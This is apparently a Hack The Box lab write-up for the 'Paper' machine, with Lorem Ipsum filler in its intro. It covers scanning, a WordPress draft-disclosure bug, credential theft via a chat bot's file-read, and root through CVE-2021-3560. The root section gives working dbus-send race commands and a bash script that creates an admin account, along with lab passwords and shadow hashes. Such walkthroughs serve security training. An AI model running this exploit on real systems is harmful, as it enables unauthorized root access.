---
layout: single
title: Paper - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2022-02-16
classes: wide
header:
  teaser: /assets/images/htb-writeup-paper/paper_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
categories:
  - hackthebox
  - infosec
tags:  
  - linux
  - easy
  - wordpress
  - rocketchat
  - polkit
  - CVE-2021-3560
---

![](/assets/images/htb-writeup-paper/paper_logo.png){: style="float: right; width: 200px; margin-left: 2em"}

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
<br>

----------------

# USER

### Step 1
**nmap:**
```bash
$ nmap -p- 10.10.11.143   
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

$ nmap -Pn -n -sCV -p22,80,443 10.10.11.143
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_http-title: HTTP Server Test Page powered by CentOS
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_http-title: HTTP Server Test Page powered by CentOS
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1

$ sudo nmap -sU --top-port=50 --open 10.10.11.143                                                                                                      1 ⨯
PORT     STATE         SERVICE
5353/udp open|filtered zeroconf
```

**nikto:**
```bash
PORT 80:
+ Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+ Uncommon header 'x-backend-server' found, with contents: office.paper
+ Retrieved x-powered-by header: PHP/7.2.24
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST

PORT 443:
+ SSL Info:        Subject:  /C=US/O=Unspecified/CN=localhost.localdomain/emailAddress=root@localhost.localdomain
                   Ciphers:  TLS_AES_256_GCM_SHA384
                   Issuer:   /C=US/O=Unspecified/OU=ca-3899279223185377061/CN=localhost.localdomain/emailAddress=root@localhost.localdomain
+ Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
```

**wpscan:**
```bash
$ wpscan --url http://office.paper --enumerate ap
[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
 |  - X-Powered-By: PHP/7.2.24
 |  - X-Backend-Server: office.paper
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://office.paper/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05).
 | Found By: Rss Generator (Passive Detection)
 |  - http://office.paper/index.php/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>
 |  - http://office.paper/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>

[+] WordPress theme in use: construction-techup
 | Location: http://office.paper/wp-content/themes/construction-techup/
 | Last Updated: 2021-07-17T00:00:00.000Z
 | Readme: http://office.paper/wp-content/themes/construction-techup/readme.txt
 | [!] The version is out of date, the latest version is 1.4
 | Style URL: http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1
 | Style Name: Construction Techup
 | Description: Construction Techup is child theme of Techup a Free WordPress Theme useful for Business, corporate a...
 | Author: wptexture
 | Author URI: https://testerwp.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.
```

- Nikto is MVP and finds `office.paper`
- `http://office.paper/` is running on WP 5.2.3

-----------

### Step 2
Looking for WP 5.2.3 vulnerabilities we find a unauthed view of private posts. 
```bash
┌──(void㉿void)-[/htb/paper]
└─$ searchsploit wordpress 5.2.3
[... snip ...]
WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts                    | multiple/webapps/47690.md
```

Reading about the vulnerability it is as simple as adding `?static=1` to view posts. <br>
`http://office.paper/?static=1` gives us:


> "Micheal please remove the secret from drafts for gods sake!"<br>
> "Michael, you have to stop putting secrets in the drafts."<br>
> "# Secret Registration URL of new Employee chat system http://chat.office.paper/register/8qozr226AhkCHZdyY"<br>
> "# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders."

Use the provided link and create an account to the rocket.chat platform. 

Reading the General chat we see that Dwight has created the bot `Recyclops` that is able to list- and fetch files. 
Start a private conversation with `Recyclops` and enumerate.

```bash
$ list
Fetching the directory listing of /sales/
total 8
drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 .
drwx------ 12 dwight dwight 4096 Feb 14 15:17 ..
drwxr-xr-x 2 dwight dwight 27 Sep 15 13:03 sale
drwxr-xr-x 2 dwight dwight 27 Jul 3 2021 sale_2

$ list sale
Fetching the directory listing of sale
total 4
drwxr-xr-x 2 dwight dwight 27 Sep 15 13:03 .
drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 ..
-rw-r--r-- 1 dwight dwight 158 Sep 15 13:03 portfolio.txt

$ file sale/portfolio.txt
<!=====Contents of file sale/portfolio.txt=====>
Portfolio
----------
- Bill
- Served the country in war
- Family built the country
- purchased paper worth a million dollars
- will probably fire me.
<!=====End of file sale/portfolio.txt=====>

$ list sale_2
total 4
drwxr-xr-x 2 dwight dwight 27 Jul 3 2021 .
drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 ..
-rw-r--r-- 1 dwight dwight 113 Jul 3 2021 portfolio.txt

$ file sale_2/portfolio.txt
<!=====Contents of file sale_2/portfolio.txt=====>
Portfolio
----------
- Christian
- Still No idea how micheal made the sale!
- Need further clarifications.
<!=====End of file sale_2/portfolio.txt=====>

$ list ../
Fetching the directory listing of ../
total 76
drwx------ 12 dwight dwight 4096 Feb 14 15:17 .
drwxr-xr-x. 3 root root 20 Feb 14 15:22 ..
lrwxrwxrwx 1 dwight dwight 9 Jul 3 2021 .bash_history -> /dev/null
-rw-r--r-- 1 dwight dwight 18 May 10 2019 .bash_logout
-rw-r--r-- 1 dwight dwight 141 May 10 2019 .bash_profile
-rw-r--r-- 1 dwight dwight 358 Jul 3 2021 .bashrc
drwxrwxr-x 2 dwight dwight 34 Feb 13 11:05 bin
-rwxr-xr-x 1 dwight dwight 1219 Feb 13 11:07 bot_restart.sh
-rwxrwxr-x 1 dwight dwight 9627 Feb 14 14:04 bumble.sh
drwx------ 5 dwight dwight 56 Jul 3 2021 .config
-rw------- 1 dwight dwight 16 Jul 3 2021 .esd_auth
-rw-rw-r-- 1 dwight dwight 2434 Feb 14 08:05 exploit.py
-rwxrwxr-x 1 dwight dwight 9628 Feb 14 07:50 exploit.sh
drwx------ 3 dwight dwight 69 Feb 14 11:00 .gnupg
drwx------ 8 dwight dwight 4096 Sep 16 07:57 hubot
-rw-rw-r-- 1 dwight dwight 18 Sep 16 07:24 .hubot_history
-rw------- 1 dwight dwight 36 Feb 14 11:12 .lesshst
drwx------ 4 dwight dwight 30 Feb 13 10:25 .local
drwxr-xr-x 4 dwight dwight 39 Jul 3 2021 .mozilla
drwxrwxr-x 5 dwight dwight 83 Jul 3 2021 .npm
-rw-rw-r-- 1 dwight dwight 0 Feb 14 15:21 root.txt
drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 sales
drwx------ 2 dwight dwight 6 Sep 16 08:56 .ssh
-r-------- 1 dwight dwight 33 Feb 13 00:40 user.txt
drwxr-xr-x 2 dwight dwight 24 Sep 16 07:09 .vim
-rw------- 1 dwight dwight 1757 Feb 14 15:17 .viminfo

$ file ../hubot/.env
<!=====Contents of file ../hubot/.env=====>
export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000
export BIND_ADDRESS=127.0.0.1
<!=====End of file ../hubot/.env=====>
```

Login with found credentials: `dwight:Queenofblad3s!23`

Grab user.txt
```bash
[dwight@paper ~]$ cat user.txt 
c08f19a9c33103d08cc0273fda6e8497
```

--------------

# ROOT

### Step 1 
- `dwight` is not able to run commands as `sudo`. 

```bash
[dwight@paper tmp]$ netstat -antp
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:48320         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      2395/node           
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      - 
```

```bash
./linpeas.sh
[... snip ...]
╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
Sudo version 1.8.29

Vulnerable to CVE-2021-3560
```

Google for `cve-2021-3560 github` and we find a lot of POCs, download one and try it out. The exploit will work as intended, a user is created, however we are not able to login as that user. 
Instead, try to exploit it manually. 

> "To avoid repeatedly triggering the authentication dialog box (which can be annoying), I recommend running the commands from an SSH session"

**Manual exploit of CVE-2021-3560:**
```bash
[dwight@paper shm]$ ssh localhost
dwight@localhosts password: Queenofblad3s!23

[dwight@paper shm]$ time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:playerthree string:”PlayerThree” int32:1

real	0m0.007s
user	0m0.003s
sys	0m0.003s
[dwight@paper shm]$ time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:playerthree string:”PlayerThree” int32:1

real	0m0.006s
user	0m0.001s
sys	0m0.004s
[dwight@paper shm]$ time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:playerthree string:”PlayerThree” int32:1

real	0m0.007s
user	0m0.002s
sys	0m0.004s
```

The time is around 6-7 milliseconds, meaning we need to kill the `dbus-send` command after approximately 3 milliseconds.
```bash
[dwight@paper shm]$ for i in {1..50} ; do dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:playerthree string:”PlayerThree” int32:1 & sleep 0.003s ; kill $! ; done

[dwight@paper shm]$ id playerthree
uid=1005(playerthree) gid=1005(playerthree) groups=1005(playerthree),10(wheel)

[dwight@paper shm]$ for i in {1..50} ; do dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1005 org.freedesktop.Accounts.User.SetPassword string: string:GoldenEye & sleep 0.003s ; kill $! ; done

[dwight@paper shm]$ su playerthree -c 'sudo su'
Password: 
[root@paper shm]# id
uid=0(root) gid=0(root) groups=0(root)

[root@paper shm]# cat /root/root.txt
2db764e7dc2b0a27f33844524930ab83

[root@paper shm]# cat /etc/shadow
root:$6$rfCS6Tb3sgIjkTux$UhBHq5wWPncgtVnltzm3Squ9KBcX3/9k0y6o8AG6lNSKOobHatUWFzPS1J8uuh/QML6kyhZ10ngXa5nCBLDkL.:18811:0:99999:7:::
dwight:$6$xVlcDig.sohk9jK0$BZEhwP6SZytZTTAMTqjb35j02yMHq/F4jl3WPwqFCtsf0Cbce4pqo3PS8OGXiJdXGE/C4Y4yQZAmiT60wt9OQ/:18811:0:99999:7:::
playerthree::19039:0:99999:7:::
```

**NOTE:** When creating the password, it must be set to blank else it wont work. 

A very simple bash script that does it all for you:
```bash
[dwight@paper shm]$ cat root.sh 
#!/bin/bash
echo "    - CVE-2021-3560 Exploit - "
echo " - Run script until it succeed -"
for i in {1..50} ; do dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:playerthree string:”PlayerThree” int32:1 & sleep 0.003s ; kill $! ; done > /dev/null 2>&1
echo "[+] Created account"
for i in {1..50} ; do dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1005 org.freedesktop.Accounts.User.SetPassword string: string:GoldenEye & sleep 0.003s 2>&1 ; kill $! ; done > /dev/null 2>&1
echo "[+] Set blank password (blank)"
echo "[+] Elevating to root.."
su playerthree -c 'sudo su'
```

```bash
[dwight@paper shm]$ ./root.sh 
    - CVE-2021-3560 Exploit - 
 - Run script until it succeed -
[+] Created account
[+] Set blank password (blank)
[+] Elevating to root..
bash: cannot set terminal process group (583183): Inappropriate ioctl for device
bash: no job control in this shell
[root@paper shm]# id
uid=0(root) gid=0(root) groups=0(root)
```

------

# References
- [Polkit Privesc - CVE-2021-3560](https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/)
